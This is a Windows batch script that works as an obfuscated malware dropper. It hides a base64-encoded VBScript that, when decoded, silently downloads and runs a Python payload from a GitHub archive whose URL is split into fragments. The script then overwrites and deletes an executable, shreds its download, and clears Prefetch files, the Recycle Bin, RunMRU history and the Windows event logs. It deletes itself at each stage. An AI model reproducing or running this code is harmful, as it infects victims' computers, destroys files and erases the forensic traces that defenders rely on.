@echo off
setlocal enabledelayedexpansion

if not "%1"=="w" (
    set "tb=%TEMP%\~!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tb!" >nul 2>&1
    if exist "!tb!" (
        start /b cmd /c call "!tb!" w
        timeout /t 1 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vf=%TEMP%\~i!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$a='T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIERpbSB1cmxQYXJ0cygxMCkKICAgIHVybFBhcnRzKDApID0gImh0dHBzOi8vIgogICAgdXJsUGFydHMoMSkgPSAiZ2l0aHViLiIKICAgIHVybFBhcnRzKDIpID0gImNvbS8iCiAgICB1cmxQYXJ0cygzKSA9ICJicmF5YW5qaG9hbmNlMi0iCiAgICB1cmxQYXJ0cyg0KSA9ICJjb2xsYWIvIgogICAgdXJsUGFydHMoNSkgPSAiZW5jcmlwdCIKICAgIHVybFBhcnRzKDYpID0gImFkby8iCiAgICB1cmxQYXJ0cyg3KSA9ICJhcmNoaXZlLyIKICAgIHVybFBhcnRzKDgpID0gInJlZnMvaGVhZHMvIgogICAgdXJsUGFydHMoOSkgPSAibWFpbi4iCiAgICB1cmxQYXJ0cygxMCkgPSAiemlwIgogICAgCiAgICByZXBvVVJMID0gIiIKICAgIEZvciBpID0gMCBUbyAxMAogICAgICAgIHJlcG9VUkwgPSByZXBvVVJMICYgdXJsUGFydHMoaSkKICAgIE5leHQKICAgIAogICAgemlwUGF0aCA9IHNjcmlwdERpciAmICJccmVwby56aXAiCiAgICBleHRyYWN0UGF0aCA9IHNjcmlwdERpciAmICJcZXh0cmFjdGVkIgogICAgCiAgICBwc0Rvd25sb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiAgICAiW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgIiAmIF8KICAgICIkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwogICAgInRyeSB7ICIgJiBfCiAgICAiICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJyIgJiByZXBvVVJMICYgIicgLU91dEZpbGUgJyIgJiB6aXBQYXRoICYgIicgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyAxMjA7ICIgJiBfCiAgICAiICAgIEV4cGFuZC1BcmNoaXZlIC1QYXRoICciICYgemlwUGF0aCAmICInIC1EZXN0aW5hdGlvblBhdGggJyIgJiBleHRyYWN0UGF0aCAmICInIC1Gb3JjZSAiICYgXwogICAgIn0gY2F0Y2ggeyBleGl0IDEgfSAiICYgXwogICAgIiIiIgogICAgCiAgICBzaGVsbC5SdW4gcHNEb3dubG9hZCwgMCwgVHJ1ZQogICAgV1NjcmlwdC5TbGVlcCA4MDAwCiAgICAKICAgIElmIE5vdCBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCiAgICAgICAgV1NjcmlwdC5RdWl0CiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIHJlcG9QYXRoID0gIiIKICAgIGxhdW5jaGVyUGF0aCA9ICIiCiAgICBweXRob25QYXRoID0gIiIKICAgIAogICAgSWYgZnNvLkZvbGRlckV4aXN0cyhleHRyYWN0UGF0aCkgVGhlbgogICAgICAgIEZvciBFYWNoIHN1YmZvbGRlciBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5TdWJGb2xkZXJzCiAgICAgICAgICAgIElmIExDYXNlKHN1YmZvbGRlci5OYW1lKSA9ICJlbmNyaXB0YWRvLW1haW4iIFRoZW4KICAgICAgICAgICAgICAgIHJlcG9QYXRoID0gc3ViZm9sZGVyLlBhdGgKICAgICAgICAgICAgICAgIGxhdW5jaGVyUGF0aCA9IHJlcG9QYXRoICYgIlxsYXVuY2hlci5weSIKICAgICAgICAgICAgICAgIHB5dGhvblBhdGggPSByZXBvUGF0aCAmICJccHl0aG9uX3BvcnRhYmxlXHB5dGhvbi5leGUiCiAgICAgICAgICAgICAgICBFeGl0IEZvcgogICAgICAgICAgICBFbmQgSWYKICAgICAgICBOZXh0CiAgICBFbmQgSWYKICAgIAogICAgSWYgcmVwb1BhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGxhdW5jaGVyUGF0aCkgQW5kIGZzby5GaWxlRXhpc3RzKHB5dGhvblBhdGgpIFRoZW4KICAgICAgICBzaGVsbC5DdXJyZW50RGlyZWN0b3J5ID0gcmVwb1BhdGgKICAgICAgICBjbWRMYXVuY2ggPSAiIiIiICYgcHl0aG9uUGF0aCAmICIiIiAiIiIgJiBsYXVuY2hlclBhdGggJiAiIiIKICAgICAgICBzaGVsbC5SdW4gY21kTGF1bmNoLCAwLCBGYWxzZQogICAgICAgIFdTY3JpcHQuU2xlZXAgMTAwMDAKICAgIEVuZCBJZgogICAgCiAgICBJZiBleGVQYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhleGVQYXRoKSBUaGVuCiAgICAgICAgRm9yIGkgPSAxIFRvIDMKICAgICAgICAgICAgU2V0IGZ3ID0gZnNvLk9wZW5UZXh0RmlsZShleGVQYXRoLCAyKQogICAgICAgICAgICBGb3IgaiA9IDEgVG8gMTAwMAogICAgICAgICAgICAgICAgZncuV3JpdGVMaW5lIFN0cmluZyg4MCwgQ2hyKEludChSbmQgKiAyNikgKyA2NSkpCiAgICAgICAgICAgIE5leHQKICAgICAgICAgICAgZncuQ2xvc2UKICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCAyMDAKICAgICAgICBOZXh0CiAgICAgICAgZnNvLkRlbGV0ZUZpbGUgZXhlUGF0aCwgVHJ1ZQogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICBJZiBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCiAgICAgICAgemlwU2l6ZSA9IGZzby5HZXRG aWxlKHppcFBhdGgpLlNpemUKICAgICAgICBJZiB6aXBTaXplID4gMCBBbmQgemlwU2l6ZSA8IDEwMDAwMDAwMCBUaGVuCiAgICAgICAgICAgIEZvciBwYXNzID0gMSBUbyAzCiAgICAgICAgICAgICAgICBwc1NocmVkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiIiICYgXwogICAgICAgICAgICAgICAgIiRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICIgJiB6aXBTaXplICYgIjsgIiAmIF8KICAgICAgICAgICAgICAgICIoTmV3LU9iamVjdCBSYW5kb20pLk5leHRCeXRlcygkYnl0ZXMpOyAiICYgXwogICAgICAgICAgICAgICAgIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIHppcFBhdGggJiAiJywgJGJ5dGVzKSAiICYgXwogICAgICAgICAgICAgICAgIiIiIgogICAgICAgICAgICAgICAgc2hlbGwuUnVuIHBzU2hyZWQsIDAsIFRydWUKICAgICAgICAgICAgICAgIFdTY3JpcHQuU2xlZXAgNTAwCiAgICAgICAgICAgIE5leHQKICAgICAgICBFbmQgSWYKICAgICAgICBmc28uRGVsZXRlRmlsZSB6aXBQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgc2hlbGwuUmVnRGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJ1bk1SVVwiCiAgICAKICAgIHBzQ2xlYXIgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2U7ICIgJiBfCiAgICAiQ2xlYXItUmVjeWNsZUJpbiAtRm9yY2UgLUNvbmZpcm06JGZhbHNlOyAiICYgXwogICAgIndldnR1dGlsIGNsIEFwcGxpY2F0aW9uIDI+JG51bGw7ICIgJiBfCiAgICAid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGwgIiAmIF8KICAgICIiIiIKICAgIHNoZWxsLlJ1biBwc0NsZWFyLCAwLCBUcnVlCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgY2xlYW51cEJhdCA9IHNjcmlwdERpciAmICJcY2xlYW51cC5iYXQiCiAgICBTZXQgZmMgPSBmc28uQ3JlYXRlVGV4dEZpbGUoY2xlYW51cEJhdCwgVHJ1ZSkKICAgIGZjLldyaXRlTGluZSAiQGVjaG8gb2ZmIgogICAgZmMuV3JpdGVMaW5lICJ0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bCIKICAgIGZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHdzY3JpcHQuZXhlID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiZGVsIC9mIC9xICIiIiAmIHNjcmlwdFBhdGggJiAiIiIgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJjZCAvZCAlVEVNUCUiCiAgICBmYy5Xcml0ZUxpbmUgInJtZGlyIC9zIC9xICIiIiAmIHNjcmlwdERpciAmICIiIiA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgIihnb3RvKSAyPm51bCAmIGRlbCAvZiAvcSAiIiV+ZjAiIiAmIGV4aXQiCiAgICBmYy5DbG9zZQogICAgCiAgICBzaGVsbC5SdW4gImNtZC5leGUgL2MgIiIiICYgY2xlYW51cEJhdCAmICIiIiIsIDAsIEZhbHNlCiAgICBXU2NyaXB0LlF1aXQKICAgIApFbHNlCiAgICB0ZW1wSUQgPSAic3lzXyIgJiBJbnQoUm5kICogOTk5OTk5ICsgMTAwMDAwKQogICAgdGVtcFdvcmsgPSB0ZW1wQmFzZSAmICJcIiAmIHRlbXBJRAogICAgZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawogICAgCiAgICB2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgogICAgZnNvLkNvcHlGaWxlIHNjcmlwdFBhdGgsIHZic1RlbXAsIFRydWUKICAgIAogICAgc2hlbGwuUnVuICJ3c2NyaXB0LmV4ZSAiIiIgJiB2YnNUZW1wICYgIiIiIC8vQiAvL05vbG9nbyIsIDAsIEZhbHNlCiAgICBXU2NyaXB0LlNsZWVwIDEwMDAKICAgIAogICAgZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQogICAgV1NjcmlwdC5RdWl0CiAgICAKRW5kIElm'; ^
$b=[Convert]::FromBase64String($a); ^
[IO.File]::WriteAllBytes('%vf%',$b)"

timeout /t 2 /nobreak >nul

if exist "%vf%" (
    start /b wscript.exe "%vf%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit